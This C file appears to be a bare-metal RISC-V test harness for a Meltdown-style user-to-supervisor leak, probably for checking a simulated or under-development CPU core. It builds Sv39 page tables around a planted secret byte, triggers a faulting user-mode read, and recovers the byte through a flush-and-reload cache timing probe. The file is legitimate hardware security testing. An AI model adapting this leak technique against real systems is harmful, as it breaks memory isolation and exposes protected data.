#include <stdint.h>
#include <stddef.h>

#include "rv64_spectre.h"

#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 78
#endif

#ifndef MELTDOWN_ATTEMPTS
#define MELTDOWN_ATTEMPTS 4
#endif

#define SECRET_VALUE 0x53u
#define PGSIZE 4096u
#define PT_ENTRIES 512u

#define PTE_V 0x001ull
#define PTE_R 0x002ull
#define PTE_W 0x004ull
#define PTE_X 0x008ull
#define PTE_U 0x010ull
#define PTE_G 0x020ull
#define PTE_A 0x040ull
#define PTE_D 0x080ull

#define MSTATUS_MPP_MASK (3ull << 11)
#define MSTATUS_MPP_U 0ull
#define MSTATUS_MPRV (1ull << 17)
#define SATP_MODE_SV39 (8ull << 60)
#define PMP_CFG_NAPOT_RWX 0x1full

#define CAUSE_LOAD_PAGE_FAULT 13ull
#define CAUSE_USER_ECALL 8ull

extern volatile uint64_t tohost;
extern void meltdown_us_user_read_ok(uint8_t *addr);
extern void meltdown_us_user_fault_only(uint8_t *addr);
extern void meltdown_us_user_gadget(uint8_t *secret, uint8_t *probe);
extern void meltdown_us_user_recover(void);
extern void meltdown_us_enter_user1(void (*entry)(uint8_t *), uint8_t *arg0);
extern void meltdown_us_enter_user2(void (*entry)(uint8_t *, uint8_t *),
                                    uint8_t *arg0,
                                    uint8_t *arg1);

static uint64_t root_pt[PT_ENTRIES] __attribute__((aligned(PGSIZE)));
static uint64_t l1_pt[PT_ENTRIES] __attribute__((aligned(PGSIZE)));
static uint64_t l0_low_pt[PT_ENTRIES] __attribute__((aligned(PGSIZE)));
static uint64_t l0_mid_pt[PT_ENTRIES] __attribute__((aligned(PGSIZE)));

static uint8_t probe[PROBE_BYTES] __attribute__((aligned(L1_SET_SPAN_BYTES)));
static uint8_t user_ok_page[PGSIZE] __attribute__((aligned(PGSIZE)));
static uint8_t secret_page[PGSIZE] __attribute__((aligned(PGSIZE)));

static volatile uint64_t trap_count;
static volatile uint64_t last_mcause;
static volatile uintptr_t last_mepc;
static volatile uintptr_t last_mtval;
static volatile uintptr_t last_mstatus;
static volatile int expect_user_fault;
static volatile int trap_panic;
volatile uintptr_t m_return_pc;
volatile uint64_t meltdown_us_return_to_m;
volatile uintptr_t meltdown_us_debug_ra;
volatile uintptr_t meltdown_us_debug_sp;
volatile uintptr_t meltdown_us_debug_target;
volatile uintptr_t meltdown_us_debug_trap_sp;
volatile uint64_t meltdown_us_satp_value;

static inline uint64_t csr_read_mstatus(void)
{
  uint64_t value;
  asm volatile("csrr %0, mstatus" : "=r"(value));
  return value;
}

static inline void csr_write_mstatus(uint64_t value)
{
  asm volatile("csrw mstatus, %0" : : "r"(value));
}

static inline void csr_write_mepc(uintptr_t value)
{
  asm volatile("csrw mepc, %0" : : "r"(value));
}

static inline void csr_write_satp(uint64_t value)
{
  asm volatile("csrw satp, %0; sfence.vma" : : "r"(value) : "memory");
}

static void host_write(const char *buf, uintptr_t len)
{
  volatile uint64_t magic_mem[8] __attribute__((aligned(64)));
  magic_mem[0] = 64;
  magic_mem[1] = 1;
  magic_mem[2] = (uintptr_t)buf;
  magic_mem[3] = len;
  asm volatile("fence rw, rw" ::: "memory");
  tohost = (uintptr_t)magic_mem;
  extern volatile uint64_t fromhost;
  while (fromhost == 0)
    ;
  fromhost = 0;
}

static void putch(char ch)
{
  host_write(&ch, 1);
}

static void puts_lite(const char *s)
{
  uintptr_t len = 0;
  while (s[len])
    len++;
  if (len != 0)
    host_write(s, len);
}

static void put_hex64(uint64_t value)
{
  static const char hex[] = "0123456789abcdef";
  puts_lite("0x");
  for (int i = 15; i >= 0; --i)
    putch(hex[(value >> (i * 4)) & 0xf]);
}

static void put_dec(uint64_t value)
{
  char buf[24];
  int pos = 0;

  if (value == 0)
  {
    putch('0');
    return;
  }

  while (value != 0 && pos < (int)sizeof(buf))
  {
    buf[pos++] = (char)('0' + (value % 10));
    value /= 10;
  }

  while (pos > 0)
    putch(buf[--pos]);
}

void meltdown_us_exit(uintptr_t code)
{
  tohost = (code << 1) | 1;
  while (1)
    ;
}

static uint64_t pte_table(void *next)
{
  return (((uintptr_t)next >> 12) << 10) | PTE_V;
}

static uint64_t pte_leaf(uintptr_t pa, uint64_t flags)
{
  return ((pa >> 12) << 10) | flags | PTE_V | PTE_A | PTE_D;
}

static void map_4k(uintptr_t va, uintptr_t pa, uint64_t flags)
{
  const size_t vpn2 = (va >> 30) & 0x1ffu;
  const size_t vpn1 = (va >> 21) & 0x1ffu;
  const size_t vpn0 = (va >> 12) & 0x1ffu;
  uint64_t *l0;

  root_pt[vpn2] = pte_table(l1_pt);

  if (vpn1 == 0)
    l0 = l0_low_pt;
  else if (vpn1 == 1)
    l0 = l0_mid_pt;
  else
  {
    puts_lite("[meltdown-us] unsupported vpn1\n");
    meltdown_us_exit(1);
  }

  l1_pt[vpn1] = pte_table(l0);
  l0[vpn0] = pte_leaf(pa, flags);
}

static void map_range_4k(uintptr_t start, uintptr_t end, uint64_t flags)
{
  start &= ~(uintptr_t)(PGSIZE - 1u);
  end = (end + PGSIZE - 1u) & ~(uintptr_t)(PGSIZE - 1u);
  for (uintptr_t addr = start; addr < end; addr += PGSIZE)
    map_4k(addr, addr, flags);
}

static void setup_page_tables(void)
{
  for (size_t i = 0; i < PT_ENTRIES; ++i)
  {
    root_pt[i] = 0;
    l1_pt[i] = 0;
    l0_low_pt[i] = 0;
    l0_mid_pt[i] = 0;
  }

  extern char _start[];
  extern char _end[];
  uintptr_t image_start = (uintptr_t)_start;
  uintptr_t image_end = (uintptr_t)_end + (256u * 1024u);

  map_range_4k(image_start, image_end, PTE_R | PTE_W | PTE_X | PTE_U);
  map_4k((uintptr_t)secret_page, (uintptr_t)secret_page, PTE_R | PTE_W);
}

static uint64_t lookup_l0_pte(uintptr_t va)
{
  const size_t vpn1 = (va >> 21) & 0x1ffu;
  const size_t vpn0 = (va >> 12) & 0x1ffu;
  uint64_t *l0 = vpn1 == 0 ? l0_low_pt : l0_mid_pt;
  return l0[vpn0];
}

static void enable_sv39(void)
{
  meltdown_us_satp_value = SATP_MODE_SV39 | ((uintptr_t)root_pt >> 12);
}

static void setup_pmp_allow_all(void)
{
  asm volatile("csrw pmpaddr0, %0" : : "r"(~0ull));
  asm volatile("csrw pmpcfg0, %0" : : "r"(PMP_CFG_NAPOT_RWX));
  asm volatile("fence rw, rw" ::: "memory");
}

uintptr_t meltdown_us_handle_trap(uintptr_t cause,
                                  uintptr_t epc,
                                  uintptr_t mtval,
                                  uintptr_t regs[32])
{
  (void)regs;
  trap_count++;
  last_mcause = cause;
  last_mepc = epc;
  last_mtval = mtval;
  last_mstatus = csr_read_mstatus();

  if (expect_user_fault && cause == CAUSE_LOAD_PAGE_FAULT)
  {
    expect_user_fault = 0;
    if (m_return_pc != 0)
    {
      uint64_t mstatus = csr_read_mstatus();
      mstatus = (mstatus & ~MSTATUS_MPP_MASK) | (3ull << 11);
      csr_write_mstatus(mstatus);
      return m_return_pc | 1u;
    }
    return (uintptr_t)meltdown_us_user_recover;
  }

  if (cause == CAUSE_USER_ECALL && m_return_pc != 0)
  {
    uint64_t mstatus = csr_read_mstatus();
    mstatus = (mstatus & ~MSTATUS_MPP_MASK) | (3ull << 11);
    csr_write_mstatus(mstatus);
    return m_return_pc | 1u;
  }

  trap_panic = 1;
  puts_lite("[meltdown-us] unexpected trap cause=");
  put_dec(cause);
  puts_lite(" epc=");
  put_hex64(epc);
  puts_lite(" mtval=");
  put_hex64(mtval);
  puts_lite(" return=");
  put_hex64(m_return_pc);
  puts_lite(" dbg_ra=");
  put_hex64(meltdown_us_debug_ra);
  puts_lite(" dbg_sp=");
  put_hex64(meltdown_us_debug_sp);
  puts_lite(" tgt=");
  put_hex64(meltdown_us_debug_target);
  puts_lite(" tsp=");
  put_hex64(meltdown_us_debug_trap_sp);
  puts_lite("\n");
  meltdown_us_exit(1);
  return epc;
}

static void flush_probe(void)
{
  for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    flush_line(&probe[i * PROBE_STRIDE]);
}

static void read_faulting_byte(uint8_t result[2],
                               uint64_t score[2],
                               uint64_t threshold)
{
  uint64_t hits[PROBE_ENTRIES];

  for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    hits[i] = 0;

  for (int attempt = 0; attempt < MELTDOWN_ATTEMPTS; ++attempt)
  {
    flush_probe();
    fence_all();
    expect_user_fault = 1;
    meltdown_us_enter_user2(meltdown_us_user_gadget, secret_page, probe);

    for (size_t i = 0; i < PROBE_ENTRIES; ++i)
    {
      const size_t mixed_i = probe_mix(i);
      const uint64_t elapsed = probe_time(&probe[mixed_i * PROBE_STRIDE]);
      if (elapsed <= threshold)
        hits[mixed_i]++;
    }
  }

  top_two_idx(hits, PROBE_ENTRIES, result, score);
}

static int smoke_tests(void)
{
  puts_lite("[meltdown-us] smoke user_read_ok\n");
  meltdown_us_enter_user1(meltdown_us_user_read_ok, user_ok_page);
  if (trap_panic)
    return -1;

  puts_lite("[meltdown-us] smoke user_fault\n");
  expect_user_fault = 1;
  meltdown_us_enter_user1(meltdown_us_user_fault_only, secret_page);
  if (trap_panic || expect_user_fault)
  {
    puts_lite("[meltdown-us] smoke fault state panic=");
    put_dec(trap_panic);
    puts_lite(" expect=");
    put_dec(expect_user_fault);
    puts_lite(" cause=");
    put_dec(last_mcause);
    puts_lite(" mtval=");
    put_hex64(last_mtval);
    puts_lite(" mstatus=");
    put_hex64(last_mstatus);
    puts_lite("\n");
    return -1;
  }

  puts_lite("[meltdown-us] smoke done traps=");
  put_dec(trap_count);
  puts_lite(" mcause=");
  put_dec(last_mcause);
  puts_lite(" mtval=");
  put_hex64(last_mtval);
  puts_lite("\n");
  return last_mcause == CAUSE_LOAD_PAGE_FAULT ? 0 : -1;
}

int main(void)
{
  if (spectre_runtime_init() != 0)
  {
    puts_lite("[meltdown-us] runtime init failed\n");
    return 1;
  }

  probe_init(probe);
  user_ok_page[0] = 0x11u;
  secret_page[0] = SECRET_VALUE;

  uint64_t measured_threshold = calibrate_probe_threshold(probe);
  uint64_t threshold = CACHE_HIT_THRESHOLD;
  if (threshold == 0)
    threshold = measured_threshold;

  puts_lite("[meltdown-us] mode=sv39-u-s\n");
  puts_lite("[meltdown-us] threshold=");
  put_dec(threshold);
  puts_lite(" measured=");
  put_dec(measured_threshold);
  puts_lite(" attempts=");
  put_dec(MELTDOWN_ATTEMPTS);
  puts_lite("\n");

  setup_page_tables();
  puts_lite("[meltdown-us] pte user=");
  put_hex64(lookup_l0_pte((uintptr_t)user_ok_page));
  puts_lite(" secret=");
  put_hex64(lookup_l0_pte((uintptr_t)secret_page));
  puts_lite("\n");
  setup_pmp_allow_all();
  enable_sv39();

  if (smoke_tests() != 0)
  {
    puts_lite("[meltdown-us] smoke failed\n");
    return 1;
  }

  uint8_t result[2] = {0, 0};
  uint64_t score[2] = {0, 0};
  read_faulting_byte(result, score, threshold);

  puts_lite("[meltdown-us] traps=");
  put_dec(trap_count);
  puts_lite(" last_cause=");
  put_dec(last_mcause);
  puts_lite(" last_mtval=");
  put_hex64(last_mtval);
  puts_lite("\n");

  puts_lite("[meltdown-us] byte 0: ");
  put_hex64(result[0]);
  puts_lite(" score=");
  put_dec(score[0]);
  puts_lite(" expected=");
  put_hex64(SECRET_VALUE);
  puts_lite(" second=");
  put_hex64(result[1]);
  puts_lite(" score2=");
  put_dec(score[1]);
  puts_lite("\n");

  puts_lite("[meltdown-us] check 0 ");
  put_hex64(result[0]);
  puts_lite(" ");
  put_hex64(SECRET_VALUE);
  puts_lite(" traps=");
  put_dec(trap_count);
  puts_lite("\n");

  return result[0] == SECRET_VALUE ? 0 : 1;
}
